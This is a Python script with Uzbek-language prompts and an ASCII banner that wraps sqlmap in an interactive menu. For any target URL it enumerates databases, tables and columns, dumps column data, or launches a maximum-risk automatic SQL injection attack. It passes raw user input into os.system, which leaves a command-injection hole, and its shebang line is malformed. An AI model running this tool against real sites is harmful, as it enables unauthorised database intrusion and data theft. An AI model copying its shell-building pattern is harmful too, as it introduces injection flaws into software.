#!/bin/bash/python

import os

def banner():
    os.system("clear")
    banner = (r"""
                                                                                   ^                      
                                                                                 J@@M                     
                                                                        ^         @@@@^                   
                                                                     ;@@@>         J@@@                   
                                                                      ;@@@J      ;j j@@@}                 
                                                                       ^@@@O  ^J@@@@^;@@@}                
                                                                   >@@@; @@@@^;@@@@@> ;@@@O               
                                                                >j _@@@@j p@@@^;@|      @@@>              
                                                              }@@@@  @@@@j J@@@>                          
                                                          ^a@@ _@@@@;_@@@@a }@@@>                         
                                                       ^} v@@@@^;@@@@@@@@@@@ >@@@v                        
                                                     |@@@@ ^@@@@J@@@@@@@@@@@@;^@@@J                       
                                                  J@M }@@@@ _@@@@@@@@@@@@@@j    @@j                       
                                               ; v@@@@ >@@@@@@@@@@@@@@@@j                                 
                                            ^@@@@ ;@@@@v@@@@@@@@@@@@@j^                                   
                                            a@@@@@ >@@@@@@@@@@@@@@a                                       
                                            |@@@@@@@@@@@@@@@@@@J                                          
                                          |a ;@@@@@@@@@@@@@@a;                                            
                                         @@@@ ;@@@@@@@@@@@;                                               
                                        |@@@@@> @@@@@@@>                                                  
                                     }@@@pO@MJ   >pp_                                                     
                                  ;@@@a                                                                   
                               ;@@@p;                                                                     
                            >p@@M>                                                                        
                           }@@>                                                                           
    """)
    print(banner)

def run_sqlmap():
    banner()
    print("SQLMap bilan ishlash")

    # Maqsadli URL'ni kiritish
    while True:
        target = input("\nMaqsadli URL'ni kiriting (masalan, http://testphp.vulnweb.com): ")
        if target.startswith("http://") or target.startswith("https://"):
            break
        print("❌ URL noto'g'ri. Qayta urinib ko'ring.")
    while True:
        print("\nQo'shimcha parametrlarni tanlang:")
        print("1. Ma'lumotlar bazasi nomlarini aniqlash")
        print("2. Jadval nomlarini aniqlash")
        print("3. Ustun nomlarini aniqlash")
        print("4. Ma'lumotlarni chiqarish")
        print("5. To‘liq avtomatik hujum")
        print("0. Chiqish")

        choice = input("\nTanlovni kiriting: ")

        if choice == "1":
            command = f"sqlmap -u {target} --dbs"
        elif choice == "2":
            db_name = input("Ma'lumotlar bazasi nomini kiriting: ")
            command = f"sqlmap -u {target} -D {db_name} --tables"
        elif choice == "3":
            db_name = input("Ma'lumotlar bazasi nomini kiriting: ")
            table_name = input("Jadval nomini kiriting: ")
            command = f"sqlmap -u {target} -D {db_name} -T {table_name} --columns"
        elif choice == "4":
            db_name = input("Ma'lumotlar bazasi nomini kiriting: ")
            table_name = input("Jadval nomini kiriting: ")
            column_name = input("Ustun nomini kiriting: ")
            command = f"sqlmap -u {target} -D {db_name} -T {table_name} -C {column_name} --dump"
        elif choice == "5":
            command = f"sqlmap -u {target} --batch --risk=3 --level=5"
        elif choice == "0":
            print("Dasturdan chiqib ketildi.")
            return
        else:
            print("❌ Noto'g'ri tanlov. Iltimos qaytadan tanlang.")

        os.system(command)
        tanlash = input("Yana sqlmapdan foydalanasizmi?: (yes/no)").lower()
        if tanlash != "yes":
            break


